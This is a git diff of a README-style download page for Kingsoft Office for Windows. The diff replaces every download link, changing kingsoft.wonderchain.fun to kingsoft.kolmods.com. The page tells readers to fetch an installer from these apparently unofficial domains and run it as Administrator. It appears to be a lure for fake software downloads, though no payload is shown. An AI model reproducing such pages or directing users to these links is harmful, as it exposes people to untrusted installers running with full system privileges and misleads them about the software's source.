@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Kingsoft Office** for Windows.
 
 <p align="center">
-  <a href="https://kingsoft.wonderchain.fun/">
+  <a href="https://kingsoft.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-Kingsoft%20Office-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Kingsoft Office">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[kingsoft.wonderchain.fun](https://kingsoft.wonderchain.fun/)** |
-| **Full URL** | `https://kingsoft.wonderchain.fun/` |
+| **Direct link** | **[kingsoft.kolmods.com](https://kingsoft.kolmods.com/)** |
+| **Full URL** | `https://kingsoft.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — kingsoft.wonderchain.fun](https://kingsoft.wonderchain.fun/)** (link above)
+1. Click **[Download — kingsoft.kolmods.com](https://kingsoft.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://kingsoft.wonderchain.fun/"><strong>⬇ Download Kingsoft Office now</strong></a></p>
+<p align="center"><a href="https://kingsoft.kolmods.com/"><strong>⬇ Download Kingsoft Office now</strong></a></p>
 
 ---
 
